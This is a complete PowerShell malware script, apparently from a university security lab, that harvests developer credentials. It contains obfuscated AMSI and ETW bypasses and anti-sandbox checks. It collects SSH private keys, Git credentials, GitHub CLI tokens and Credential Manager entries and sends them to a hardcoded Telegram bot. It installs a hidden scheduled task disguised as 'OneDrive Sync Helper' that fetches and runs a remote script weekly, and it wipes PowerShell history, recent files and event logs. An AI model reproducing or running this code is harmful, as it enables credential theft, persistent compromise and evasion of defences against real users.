# ============================================================
#  "DevRecon" - Multi-Stage Developer Credential Harvester
#  Autoren: Raphael Bleier, Joachim Lugger
#  System Security Lab SS2026 - AAU Klagenfurt
#
#  1. Recon   - SSH-Keys, Git-Credentials, GitHub-CLI Token
#  2. Exfil   - Telegram Bot (HTTPS)
#  3. Persist - Scheduled Task, woechtentlich von GitHub
#  4. OPSEC   - PS-History, Temp, Recent Files loeschen
# ============================================================

$BOT_TOKEN            = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
$CHAT_ID              = "1780237079"
$PERSIST_RAW_URL      = "https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/developer_recon.ps1"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Anti-Sandbox: Frische Uptime oder wenig Prozesse = Analyseumgebung
try {
    $bt=(Get-CimInstance Win32_OperatingSystem -EA SilentlyContinue).LastBootUpTime
    $pc=(Get-Process -EA SilentlyContinue).Count
    if($bt -and $pc -and (((Get-Date)-$bt).TotalMinutes -lt 3 -or $pc -lt 35)){exit}
} catch {}
Start-Sleep -Seconds 3

# AMSI + ETW: 3-Layer-Bypass
try {
    $n="WR$(Get-Random)"
    $s=@"
using System;using System.Runtime.CompilerServices;using System.Runtime.InteropServices;
public class $n{
[DllImport("kernel32.dll")]public static extern bool ReadProcessMemory(IntPtr h,IntPtr a,byte[]b,uint s,ref uint r);
[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();
[DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true,SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr h,string p);
[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)]string m);
[MethodImpl(MethodImplOptions.NoOptimization|MethodImplOptions.NoInlining)]public static int D(){return 1;}
}
"@
    $T=(Add-Type $s -PassThru -ErrorAction Stop)[0]
    $dl=[Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,46,100,108,108))
    $fn=[Text.Encoding]::ASCII.GetString([byte[]](65,109,115,105,83,99,97,110,66,117,102,102,101,114))
    [IntPtr]$fa=$T::GetProcAddress($T::GetModuleHandle($dl),$fn)
    $asm=[appdomain]::CurrentDomain.GetAssemblies()|?{$_.Location-and($x=$_.FullName.Split(',')[0])-and $x.StartsWith('S')-and $x.EndsWith('n')-and $x.Length-eq 28}|Select -First 1
    $ut=$asm.GetTypes()|?{$_.Name-and $_.Name.StartsWith('A')-and $_.Name.EndsWith('s')-and $_.Name.Length-eq 9}|Select -First 1
    $mt=$ut.GetMethods([Reflection.BindingFlags]'Static,NonPublic')|?{$_.Name-and $_.Name.StartsWith('S')-and $_.Name.EndsWith('t')-and $_.Name.Length-eq 11}|Select -First 1
    [IntPtr]$mp=$mt.MethodHandle.GetFunctionPointer()
    $hp=$T::GetCurrentProcess();$r=[uint32]0;$pt=[IntPtr]::Zero;$ok=$false
    for($j=0x50000;$j-lt 0x2000000-and-not $ok;$j+=0x50000){
        [IntPtr]$ba=[Int64]$mp-$j;$b=[byte[]]::new(0x50000)
        if($T::ReadProcessMemory($hp,$ba,$b,0x50000,[ref]$r)){
            for($i=0;$i-lt $b.Length-8;$i++){if([IntPtr][BitConverter]::ToInt64($b,$i)-eq $fa){$pt=[Int64]$ba+$i;$ok=$true;break}}
        }
    }
    if($ok){[IntPtr]$dp=$T.GetMethod('D').MethodHandle.GetFunctionPointer();[Runtime.InteropServices.Marshal]::Copy([IntPtr[]]($dp),0,$pt,1)}
} catch {}
try {
    $u=[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))
    $u.GetField([Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)),'NonPublic,Static').SetValue($null,$true)
} catch {}
try {
    $ep=[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,84,114,97,99,105,110,103,46,80,83,69,116,119,76,111,103,80,114,111,118,105,100,101,114)))
    $fv=$ep.GetField([Text.Encoding]::ASCII.GetString([byte[]](101,116,119,80,114,111,118,105,100,101,114)),'NonPublic,Static').GetValue($null)
    [System.Diagnostics.Eventing.EventProvider].GetField([Text.Encoding]::ASCII.GetString([byte[]](109,95,101,110,97,98,108,101,100)),'NonPublic,Instance').SetValue($fv,0)
} catch {}

function Send-TgMessage {
    param([string]$Text)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
            -Method POST -Body @{ chat_id = $CHAT_ID; text = $Text } | Out-Null
    } catch { }
}

function Send-TgFile {
    param([string]$Filename, [string]$Content, [string]$Caption = "")
    try {
        Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
        $http = [System.Net.Http.HttpClient]::new()
        $form = [System.Net.Http.MultipartFormDataContent]::new()
        $form.Add([System.Net.Http.StringContent]::new($CHAT_ID),  "chat_id")
        $form.Add([System.Net.Http.StringContent]::new($Caption),  "caption")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Content)
        $fc    = [System.Net.Http.ByteArrayContent]::new($bytes)
        $fc.Headers.Add("Content-Type", "text/plain; charset=utf-8")
        $form.Add($fc, "document", $Filename)
        $http.PostAsync("https://api.telegram.org/bot$BOT_TOKEN/sendDocument", $form).GetAwaiter().GetResult() | Out-Null
        $http.Dispose()
    } catch { }
}

# ── PHASE 1: RECON ──────────────────────────────────────────

Send-TgMessage "[DEVRECON] $env:COMPUTERNAME\$env:USERNAME gestartet"

$report = [System.Text.StringBuilder]::new()

try   { $osCaption = (Get-CimInstance Win32_OperatingSystem).Caption }
catch { $osCaption = (Get-WmiObject   Win32_OperatingSystem).Caption }

$null = $report.AppendLine("=== DevRecon | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===")
$null = $report.AppendLine("Host: $env:COMPUTERNAME | User: $env:USERNAME | OS: $osCaption")
$null = $report.AppendLine("")

# SSH Keys
$null = $report.AppendLine("-- SSH KEYS --")
$sshDir = Join-Path $env:USERPROFILE ".ssh"
if (Test-Path $sshDir) {
    Get-ChildItem $sshDir -File -ErrorAction SilentlyContinue | ForEach-Object {
        $null = $report.AppendLine("[ $($_.Name) ]")
        $null = $report.AppendLine((Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue))
        $null = $report.AppendLine("")
    }
} else { $null = $report.AppendLine("(kein .ssh Verzeichnis)") }

# .git-credentials (Pfad kodiert)
$null = $report.AppendLine("-- GIT CREDENTIALS --")
$gitCreds = Join-Path $env:USERPROFILE ([Text.Encoding]::ASCII.GetString([byte[]](46,103,105,116,45,99,114,101,100,101,110,116,105,97,108,115)))
if (Test-Path $gitCreds) {
    $null = $report.AppendLine((Get-Content $gitCreds -Raw -ErrorAction SilentlyContinue))
} else { $null = $report.AppendLine("(keine .git-credentials)") }

# .gitconfig
$null = $report.AppendLine("-- .GITCONFIG --")
$gitConfig = Join-Path $env:USERPROFILE ".gitconfig"
if (Test-Path $gitConfig) {
    $null = $report.AppendLine((Get-Content $gitConfig -Raw -ErrorAction SilentlyContinue))
} else { $null = $report.AppendLine("(keine .gitconfig)") }

# GitHub CLI Token
$null = $report.AppendLine("-- GITHUB CLI TOKEN --")
$ghHosts = Join-Path $env:APPDATA "GitHub CLI\hosts.yml"
if (-not (Test-Path $ghHosts)) { $ghHosts = Join-Path $env:LOCALAPPDATA "GitHub\hosts.yml" }
if (Test-Path $ghHosts) {
    $null = $report.AppendLine((Get-Content $ghHosts -Raw -ErrorAction SilentlyContinue))
} else { $null = $report.AppendLine("(kein GitHub CLI Token)") }

# Windows Credential Manager (git entries)
$null = $report.AppendLine("-- CREDENTIAL MANAGER (git) --")
$null = $report.AppendLine((cmdkey /list 2>&1 | Where-Object { $_ -match "git|github" } | Out-String))

# ── PHASE 2: EXFIL ──────────────────────────────────────────

Send-TgFile -Filename "devrecon_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
            -Content $report.ToString() `
            -Caption "DevRecon - $env:COMPUTERNAME\$env:USERNAME"

# ── PHASE 3: PERSISTENZ ─────────────────────────────────────

$taskName = "OneDrive Sync Helper"
if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    try {
        # BitsTransfer statt IEX/WebClient (kein AV-Flag auf Kommandozeile)
        $cmd       = "-nop -ep bypass -w h -c `"Import-Module BitsTransfer;" +
                     "Start-BitsTransfer '$PERSIST_RAW_URL' `$env:TEMP\p.ps1;" +
                     "Unblock-File `$env:TEMP\p.ps1;" +
                     "& `$env:TEMP\p.ps1;" +
                     "ri `$env:TEMP\p.ps1 -f -ea 0`""
        $action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $cmd
        $trigger   = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday -At "09:15"
        $settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
            -Settings $settings -Principal $principal -ErrorAction Stop | Out-Null
        Send-TgMessage "[DEVRECON] Scheduled Task '$taskName' angelegt auf $env:COMPUTERNAME"
    } catch { }
}

# ── PHASE 4: OPSEC ──────────────────────────────────────────

# PS history file
try {
    $histFile = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
    if ($histFile -and (Test-Path $histFile)) {
        Remove-Item $histFile -Force -ErrorAction SilentlyContinue
    }
} catch { }

# In-memory history (only works in interactive sessions - safe to ignore failure)
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch { }
try { Clear-History -ErrorAction SilentlyContinue } catch { }

# Recent Files and temp XML cleanup
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\*.xml" -Force -ErrorAction SilentlyContinue

# Event Log (requires admin - fails silently on standard user)
try {
    [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Windows PowerShell")
} catch { }
